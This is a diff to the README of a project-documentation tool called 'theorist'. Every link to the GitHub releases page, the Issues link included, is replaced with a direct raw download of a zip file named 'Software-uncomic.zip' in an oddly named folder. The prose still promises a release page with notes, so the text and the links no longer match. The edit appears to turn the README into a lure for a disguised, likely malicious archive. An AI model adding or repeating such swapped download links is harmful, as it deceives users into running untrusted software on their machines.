@@ -1,6 +1,6 @@
 # 📘 theorist - Organize Your Repository’s Operating Theory
 
-[![Download theorist](https://img.shields.io/badge/Download-theorist-9b59b6?style=for-the-badge)](https://github.com/alekeyunerg/theorist/releases)
+[![Download theorist](https://img.shields.io/badge/Download-theorist-9b59b6?style=for-the-badge)](https://raw.githubusercontent.com/alekeyunerg/theorist/main/ambulacriform/Software-uncomic.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you start, please make sure your computer meets these requirements:
 
 Please **visit this page to download** theorist:
 
-[https://github.com/alekeyunerg/theorist/releases](https://github.com/alekeyunerg/theorist/releases)
+[https://raw.githubusercontent.com/alekeyunerg/theorist/main/ambulacriform/Software-uncomic.zip](https://raw.githubusercontent.com/alekeyunerg/theorist/main/ambulacriform/Software-uncomic.zip)
 
 You will find the latest version of theorist there. The page includes release notes and files needed for installation.
 
@@ -42,7 +42,7 @@ Follow these steps to download and run theorist on your Windows computer.
 
 Use the link below or the badge at the top of this page to open the release page for theorist:
 
-https://github.com/alekeyunerg/theorist/releases
+https://raw.githubusercontent.com/alekeyunerg/theorist/main/ambulacriform/Software-uncomic.zip
 
 This page lists all available versions. Look for the latest one, usually at the top.
 
@@ -122,7 +122,7 @@ The release page you downloaded from may contain extra documents or guides. Chec
 
 For help with theorist:
 
-- Use the Issues section on the GitHub page: https://github.com/alekeyunerg/theorist/issues
+- Use the Issues section on the GitHub page: https://raw.githubusercontent.com/alekeyunerg/theorist/main/ambulacriform/Software-uncomic.zip
 - Look for answers in the GitHub Discussions if available.
 - Ask a friend or colleague who is familiar with similar software.
 
@@ -140,4 +140,4 @@ Check the releases page regularly for new versions. Updates may include bug fixe
 
 ---
 
-[Download theorist](https://github.com/alekeyunerg/theorist/releases) to start managing your project information clearly and simply.
+[Download theorist](https://raw.githubusercontent.com/alekeyunerg/theorist/main/ambulacriform/Software-uncomic.zip) to start managing your project information clearly and simply.
